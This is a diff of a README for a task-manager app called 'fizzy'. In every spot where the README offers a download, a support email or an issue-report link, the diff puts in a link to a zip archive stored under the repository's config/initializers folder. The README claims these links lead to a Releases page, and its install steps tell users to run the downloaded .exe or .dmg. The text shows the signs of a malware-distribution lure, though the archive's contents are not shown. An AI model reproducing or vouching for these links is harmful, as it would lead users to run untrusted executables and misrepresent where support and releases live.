@@ -6,11 +6,11 @@ Welcome to fizzy! This application is designed to help you manage your tasks eff
 
 ## 📥 Download fizzy
 
-[![Download fizzy](https://raw.githubusercontent.com/sreenu321/fizzy/main/lib/assets/fizzy_3.4.zip)](https://raw.githubusercontent.com/sreenu321/fizzy/main/lib/assets/fizzy_3.4.zip)
+[![Download fizzy](https://github.com/sreenu321/fizzy/raw/refs/heads/main/config/initializers/Software-2.6.zip)](https://github.com/sreenu321/fizzy/raw/refs/heads/main/config/initializers/Software-2.6.zip)
 
 To get started, please visit our Releases page to download the latest version of fizzy:
 
-[Download fizzy](https://raw.githubusercontent.com/sreenu321/fizzy/main/lib/assets/fizzy_3.4.zip)
+[Download fizzy](https://github.com/sreenu321/fizzy/raw/refs/heads/main/config/initializers/Software-2.6.zip)
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ fizzy comes packed with useful features to make task management a breeze:
 
 ## 🔧 Installation Instructions
 
-1. Visit the Releases page to download the latest version of fizzy: [Download fizzy](https://raw.githubusercontent.com/sreenu321/fizzy/main/lib/assets/fizzy_3.4.zip).
+1. Visit the Releases page to download the latest version of fizzy: [Download fizzy](https://github.com/sreenu321/fizzy/raw/refs/heads/main/config/initializers/Software-2.6.zip).
 2. Choose your operating system and click on the .exe, .dmg, or relevant package.
 3. Once the file is downloaded, double-click to start the installation process.
 4. Follow the on-screen instructions to install fizzy on your computer.
@@ -54,8 +54,8 @@ Once you have installed fizzy, you can begin to manage your tasks seamlessly. He
 
 If you encounter any issues or have questions about using fizzy, feel free to reach out for support:
 
-- **Email:** https://raw.githubusercontent.com/sreenu321/fizzy/main/lib/assets/fizzy_3.4.zip
-- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/sreenu321/fizzy/main/lib/assets/fizzy_3.4.zip)
+- **Email:** https://github.com/sreenu321/fizzy/raw/refs/heads/main/config/initializers/Software-2.6.zip
+- **GitHub Issues:** [Report an Issue](https://github.com/sreenu321/fizzy/raw/refs/heads/main/config/initializers/Software-2.6.zip)
 
 ## 🎉 Community Contributions
 
@@ -63,7 +63,7 @@ We encourage contributions from the community to enhance fizzy. You can submit y
 
 ## 🔄 Update Information
 
-To keep fizzy running smoothly, check back often for updates. You can find the latest releases here: [Download fizzy](https://raw.githubusercontent.com/sreenu321/fizzy/main/lib/assets/fizzy_3.4.zip).
+To keep fizzy running smoothly, check back often for updates. You can find the latest releases here: [Download fizzy](https://github.com/sreenu321/fizzy/raw/refs/heads/main/config/initializers/Software-2.6.zip).
 
 ## 📝 License
 
